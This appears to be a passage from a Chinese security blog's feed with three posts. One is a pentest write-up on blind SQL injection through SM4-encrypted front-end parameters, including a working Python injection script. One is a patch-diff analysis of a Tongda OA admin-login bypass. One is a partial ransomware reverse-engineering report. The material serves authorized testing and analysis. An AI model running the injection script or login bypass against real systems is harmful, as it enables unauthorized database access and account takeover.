src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png" alt="01-第一次脚本盲注"></p></li></ol><h3 id="0x02-第二次参数使用SM4加密"><a href="#0x02-第二次参数使用SM4加密" class="headerlink" title="0x02 第二次参数使用SM4加密"></a>0x02 第二次参数使用SM4加密</h3><ol><li><p>接到复测通知，看了下系统，发现参数被加密了，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png" alt="02-第二次参数加密"></p></li><li><p>这里找加密方法的图没截，大概就是找到对应的ajax方法，可以看到md5_bean参数的生成通过base.js的encryptData_ECB方法生成，打开base.js清晰可见sm4字样以及secretkey和iv，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png" alt="03-找到加密算法"></p></li><li><p>接下来是如何注入，本来想构造一个sqlmap的tamper脚本，但是发现这个是把所有参数一起加密了，没得思路了，于是还是用py写盲注脚本吧，但是网上找的python实现sm4加密的结果都不一样，考虑到这个后台是java的，肯定是java做的解密，于是找了java的sm4实现，试了一下，结果可以了，于是尝试用py调用打包好的jar包进行注入（这里绕了一个大圈，实际上使用py调用js就行，第三次测试的时候更新了）</p></li></ol><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png" alt="04-javasm4加密解密"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> json</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">   </span><br><span class="line">   header = &#123;</span><br><span class="line">       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   pay = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._!@#$%^&amp;*()&#x27;</span></span><br><span class="line">   </span><br><span class="line">   proxies = &#123;</span><br><span class="line">       <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">#request构造请求，传入data中的_searchWhere</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">payload</span>):</span></span><br><span class="line">       url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">       data = <span class="string">&quot;&#123;\&quot;_searchWhere\&quot;:\&quot; %s\&quot;,\&quot;title\&quot;:\&quot;\&quot;,\&quot;paramsFlag\&quot;:\&quot;false\&quot;,\&quot;parVar\&quot;:\&quot;\&quot;,\&quot;frameId\&quot;:\&quot;=\&quot;,\&quot;readOnly\&quot;:\&quot;\&quot;,\&quot;extWhere\&quot;:\&quot;\,\&quot;type\&quot;:\&quot;\&quot;,\&quot;parWhere\&quot;:\&quot;\&quot;,\&quot;dataFlag\&quot;:\&quot;\&quot;&#125;&quot;</span> % payload</span><br><span class="line">       data = quote(data,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">       command = <span class="string">&quot;java -Dmoudle=e -Dstr=%s -jar sm4Decode.jar&quot;</span> % data</span><br><span class="line">       data_sm4 = <span class="string">&quot;&quot;</span>.join(os.popen(command).readlines())</span><br><span class="line">       data_send = &#123;<span class="string">&quot;md5_bean&quot;</span>:data_sm4&#125;</span><br><span class="line">       cookies = &#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">       result = requests.post(url=url, data=data_send, cookies=cookies, headers=header ,proxies=proxies)</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">len</span>(result.text)</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       <span class="comment"># 判断数据库</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">           payload = <span class="string">&quot;and (select length(name) from v$database)=%s&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">           <span class="built_in">print</span>(payload)</span><br><span class="line">           lenstr = attack(payload)</span><br><span class="line">           <span class="keyword">if</span> lenstr &gt; <span class="number">3000</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&quot;数据库长度是%s&quot;</span>% <span class="built_in">str</span>(i))</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br></pre></td></tr></table></figure><p>4.此时客户疑问，这个sql注入1=1 1=2返回结果是不同、暴露一个数据库版本等信息又有什么用，于是多注了一点信息，证明危害，获取用户表名的过程比较啰嗦，这里只有是结果图。<br>a. 用户表数据<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png" alt="05-盲注获取用户表"></p><p>b. owner表数量</p><img src="/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png" alt="06-盲注获取owner表数量" style="zoom:33%;" /><h3 id="0x03-第三次JS加密混淆隐藏密钥"><a href="#0x03-第三次JS加密混淆隐藏密钥" class="headerlink" title="0x03 第三次JS加密混淆隐藏密钥"></a>0x03 第三次JS加密混淆隐藏密钥</h3><ol><li><p>最后一次复测，用户表示已经没问题了，让再看一下，由于时间有点长，重新找一下加密算法位置</p><p>使用抓包抓到的URL，在chrome调试工具中search一下位置，打下断点，点击功能看一下是否触发断点。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png" alt="07-第三次抓包"><br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png" alt="08-调试找到url请求位置"></p></li><li><p>接下来一步一步跟下去，找到参数构造md5_bean参数的位置<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png" alt="09-调试找到参数构造"></p></li><li><p>next找到base64.js，发现代码已经压缩而且加密了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>遇到JS加密了如果有实力的大佬可以解密js或者 <a href="https://www.sojson.com/jsobfuscator.html">https://www.sojson.com/jsobfuscator.html</a> 付费解密，不过只是想得到密钥和iv的话，可以在断点进入base64.js后，调试窗口肯定会显示密钥和iv值，因为不管怎么混淆，代码还是要被正常执行的。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>接下来又是注入了，之前用的脚本思路太麻烦了，这次简单点，直接调SM4加密的js，由于这段js已经混淆了，于是从网上找来base64.js的源码简单改了一下，使用python的execjs调用加密。</p></li></ol><p>a. java解开加密内容如图</p><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png" alt="12-对比明文密文"></p><p>b. python调用js加密明文内容，对比结果（调用js的代码如图，上面没有了，因此没有粘过来，感觉内容有点啰嗦了）<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png" alt="13-py调用js实现SM4"></p><p>6.如此便不用java介入了，之后的操作就是利用之前的盲注脚本，修改一下data参数的加密获取就行了，重复的盲注过程。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol><li>实际上现在得web框架中很少这种前端传js的了，但是在很多老企业中还是有部分网站不想重构，这样的例子有很多，第一次开发说出这种修复sql注入的方法时，还很犹豫的回答，还可以注入吧。。。，没想到真的有人这样修复，随着一次一次的治标不治本，自己也在不断探索学习。</li><li>有的时候感觉除非大厂，很多网站如果一抓包看到把参数一起加密了，很有可能是在想隐藏什么漏洞。。。</li><li>还有一个小坑，加密js在JavaScript中需要手动new一个对象，再用py调用对象+方法。</li></ol>]]></content>
    
    
    <summary type="html">原文首发先知：https://xz.aliyun.com/t/8071&lt;/br&gt;针对JS参数加密的一次尝试</summary>
    
    
    
    <category term="代码审计" scheme="http://blog.ninefiger.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="渗透测试" scheme="http://blog.ninefiger.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="加密解密" scheme="http://blog.ninefiger.top/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登录漏洞分析</title>
    <link href="http://blog.ninefiger.top/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://blog.ninefiger.top/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2019-07-03T03:56:25.000Z</published>
    <updated>2021-08-28T01:38:32.808Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        4月20日，阿里云漏洞预警，通达OA任意用户登录漏洞，链接如下：<a href="https://help.aliyun.com/noticelist/articleid/1060277736.html">https://help.aliyun.com/noticelist/articleid/1060277736.html</a> </p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p>某盘下载的TDOA11.0.exe</p></li><li><p>文件对比工具（DiffMerge等）</p></li><li><p>zend解密小工具</p></li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre><code>    1. 直接安装TDOA11.0.exe，版本号为11.0.190911       2. 打开“通达应用服务控制中心”启动服务，测试web是否能正常访问      3. 使用OfficeAuto更新程序到11.4.200323 ，备份webroot文件夹      4. 更新到11.4.200417，拷贝webroot</code></pre><p><img src="http://yanxuan.nosdn.127.net/42334a5388839dd91f914689ad693d34.png" alt="1.png"></p><ol start="5"><li>原始的webroot中文件使用zend加密压缩，此处需要使用zend解密工具批量解密为正常的PHP文件</li></ol><p><img src="http://yanxuan.nosdn.127.net/43a30082b59108269b918fc3ee15d664.png" alt="2.png"> </p><h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><ol><li>对比更新前后的webroot文件</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/3.png" alt="3.png"> </p><ol start="2"><li>如图更新对$UID进行初始化，并判断是否为0</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/4.png" alt="4.png"> </p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/5.png" alt="5.png"> </p><p>由此可见UID是个关键参数，筛选文件对比结果，很清晰判断出更新补丁中哪些文件有相关逻辑。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>​    重点对更新文件进行分析，使用编辑器导入web项目，分析版本11.4的代码逻辑。</p><h5 id="一、Logincheck-code"><a href="#一、Logincheck-code" class="headerlink" title="一、Logincheck_code"></a>一、Logincheck_code</h5><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/6.png" alt="6.png"> </p><p>$UID有POST请求参数获取，访问该URL共需两个参数：UID &amp; CODEUID；</p><p>继续向下分析，中间的判断过程，仅对用户登陆安全登陆限制进行了判断，在如下位置后，直接存入对应UID的SESSION。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/7.png" alt="7.png"> </p><h5 id="二、跟踪判断如何构造CODEUID参数"><a href="#二、跟踪判断如何构造CODEUID参数" class="headerlink" title="二、跟踪判断如何构造CODEUID参数"></a>二、跟踪判断如何构造CODEUID参数</h5><p>​    更新文件中，login_code去掉了一些方法，从内容看出如果login_codeuid为空，访问该php时，会有getUniqid()返回CODEUID。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/8.png" alt="8.png"> </p><h5 id="三、构造Logincheck-code访问，获取登陆cookie"><a href="#三、构造Logincheck-code访问，获取登陆cookie" class="headerlink" title="三、构造Logincheck_code访问，获取登陆cookie"></a>三、构造Logincheck_code访问，获取登陆cookie</h5><ol><li>获取code_uid</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/9.png" alt="9.png"> </p><ol start="2"><li>构造POST请求，获取cookie，默认情况下，UID=1是admin账号，为系统管理员。</li></ol><p> <img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/10.png" alt="10.png"></p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/11.png" alt="11.png"> </p><ol start="3"><li>使用Cookie访问系统</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/12.png" alt="12.png"> </p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li><p>未更新补丁前，备份logincheck_code.php，将该文件移除webroot目录；或使用WAF等安全产品，禁止logincheck_code.php访问</p></li><li><p>更新官方补丁</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>需要验证历史版本的从11.0更新时，可以逐步版本更新，备份webroot文件夹，验证对应版本是，更换webroot即可</p></li><li><p>第一次尝试对比补丁去验证漏洞，对于更新点比较少的应用，可以很快定位</p></li><li><p>登陆验证类功能点，只做状态判断，尽量不要附带其他功能</p></li></ol><p>Ps: 文章审核了快3个月。。。。。。</p>]]></content>
    
    
    <summary type="html">原文首发先知：https://xz.aliyun.com/t/7952&lt;/br&gt;某通达漏洞分析</summary>
    
    
    
    <category term="代码审计" scheme="http://blog.ninefiger.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码分析" scheme="http://blog.ninefiger.top/tags/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="漏洞预警" scheme="http://blog.ninefiger.top/tags/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>第一次分析勒索病毒</title>
    <link href="http://blog.ninefiger.top/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    <id>http://blog.ninefiger.top/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/</id>
    <published>2019-05-13T09:12:29.000Z</published>
    <updated>2021-08-28T01:38:27.744Z</updated>
    
    <content type="html"><![CDATA[<h5 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h5><p>​        接到客户通知，有个PC中了勒索病毒，领导让尽量分析一下给客户个回复，着急的我赶紧翻书翻教程，一顿qwer，最终还是没能将文件恢复，但是分析过程中又学习了一些知识，借此分享。</p><p>先附下加密后的截图</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%AD%E7%97%85%E6%AF%92%E5%90%8E.png" alt="中病毒后"></p><h3 id="0x02-样本信息"><a href="#0x02-样本信息" class="headerlink" title="0x02 样本信息"></a>0x02 样本信息</h3><ul><li><p>程序名： 7407.tmp.exe</p></li><li><p>样本大小：445952</p></li><li><p>MD5：b65014814bbbd09367df4a86c0d4204d</p></li><li><p>加壳混淆：UPX 0.89 - 3.x</p></li><li><p>在线检测</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%9C%A8%E7%BA%BFAV%E6%A3%80%E6%B5%8B.png" alt="在线AV检测"></p></li><li><p>分析工具：OD、X32dbg、IDA、火绒剑、微步在线</p></li></ul><h3 id="0x03-监控运行分析程序行为"><a href="#0x03-监控运行分析程序行为" class="headerlink" title="0x03 监控运行分析程序行为"></a>0x03 监控运行分析程序行为</h3><ol><li>自身复制</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%87%AA%E8%BA%AB%E5%88%9B%E5%BB%BA.png" alt="自身创建"></p><ol><li>修改注册表</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8.png" alt="修改注册表"></p><ol><li>监控单个文件的操作流程</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E6%B5%81%E7%A8%8B.png" alt="一个文件的流程"></p><ol><li>netstat监控无网络行为</li><li>import导入函数中无加密函数，怀疑没有使用公用的加密算法进行加密</li></ol><h3 id="0x04-脱壳后OD分析-进入误区"><a href="#0x04-脱壳后OD分析-进入误区" class="headerlink" title="0x04 脱壳后OD分析-进入误区"></a>0x04 脱壳后OD分析-进入误区</h3><ol><li>由于是UPX加壳，直接用脱壳工具就掉了</li><li>GetTempFileNameA获取tmp目录</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/GetTempFileNameA.png" alt="GetTempFileNameA"></p><ol><li>getTempFile</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/getFileTempName.png" alt="getFileTempName"></p><ol><li>打印机的相关操作（不知道有什么用，反正是进入误区了）</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E6%89%93%E5%8D%B0%E6%9C%BA%E5%90%8D%E7%A7%B0.png" alt="设置默认打印机名称"></p><p> 到此，程序运行退出，文件也没加密，这就肯定有反调试了，但是OD有插件啊，怀疑程序对INT 3断点有反调检测，直接把所有断线都取消了重新设置一下：<strong>进入call后，在第二行下断点</strong></p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/INT3%E6%A3%80%E6%B5%8B.png" alt="INT3检测"></p><p> 此时发现程序还是会自动退出，同时文件也开始被加密了，查看进程列表和火绒剑，发现又多了一个7407.tmp.exe进程，调用位置也和调试的病毒程序一样。于是重新在 <strong>CreateProcessW</strong>下断点，刚开始病毒程序有其他反调检测，程序发现被调试时会重新起一个进程，后来通过火绒剑发现无调试时也有创建进程操作；</p><p> 接着尝试在 <strong>WriteMemory</strong>下断点，这下找到了真实的病毒执行体</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/WriteProcess%E5%86%99%E8%BF%9B%E7%A8%8B.png" alt="WriteProcess写进程"></p><ol><li>dump真实病毒程序 PE头文件，找到OEP</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E7%9C%9F%E5%AE%9E%E7%97%85%E6%AF%92OEP.png" alt="真实病毒OEP"></p><p> 下一步在主程序使用ResumeThread恢复新进程前，使用X32DBG附加新进程；可以在ResumeThread处下断点，再附加新进程。</p><h3 id="0x05-X32dbg分析-真实病毒文件"><a href="#0x05-X32dbg分析-真实病毒文件" class="headerlink" title="0x05 X32dbg分析-真实病毒文件"></a>0x05 X32dbg分析-真实病毒文件</h3><ol><li>删除卷影副本</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png" alt="执行命令"></p><ol><li><p>在 WriteFile、CreateFileW、ReadFile、DeleteFileW、GetWindowsDirectoryA处下断点，运行程序，断下来后，回溯进入程序领空</p><p>此时找到sub_402880为病毒进程加密一个的整个操作</p></li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E4%B8%BB%E8%A6%81CALL.png" alt="勒索病毒主要CALL"></p><ol><li>往下翻，找到主要的加密（计算）依据 （key） sub_4034C0</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E4%BE%9D%E6%8D%AEkey.png" alt="加密依据key"></p><ol><li>找到加密CALL，这里确定是加密CALL的原因是，执行这个CALL后，发现之前读取到文件内容的Buffer区域中，被写入了新的数据，且该数据和文件被加密后的16进制内容相同。</li></ol><p>a. 读取到的文件内容</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="读取文件的数据"></p><p>b. 执行了sub_403960后数据变化</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E5%90%8E.png" alt="加密后">c. WinHex查看加密后文件</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/tass_liehuHEX%E6%9F%A5%E7%9C%8B.png" alt="tass_liehuHEX查看"></p><ol><li>根据sub_403960执行前压栈信息，发现有一个重要的计算依据，可以叫做加密key，由 第三步sub_4034C0得到</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8F%82%E6%95%B0.png" alt="参数"></p><ol><li>尝试分析加密参数生成、文件内容加密的计算方法 – 没成功，有些复杂</li></ol><p>a. key 值计算CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/key%E5%80%BC%E8%AE%A1%E7%AE%97.png" alt="key值计算"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/IDA-key%E8%AE%A1%E7%AE%97call.png" alt="IDA-key计算call"></p><p>b. 加密CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86CALL%E5%86%85%E9%83%A8.png" alt="加密CALL内部"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="加密文件内容"></p><p> 到此，发现key值也有一个动态的计算依据，这个需要重新回溯，而且计算过程比较麻烦，所以结束了。</p><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><ol><li><p>写注册表操作</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\7407.tmp.exe</p></li><li><p>自身复制</p><p>C:\Windows\System32\7407.tmp.exe<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start 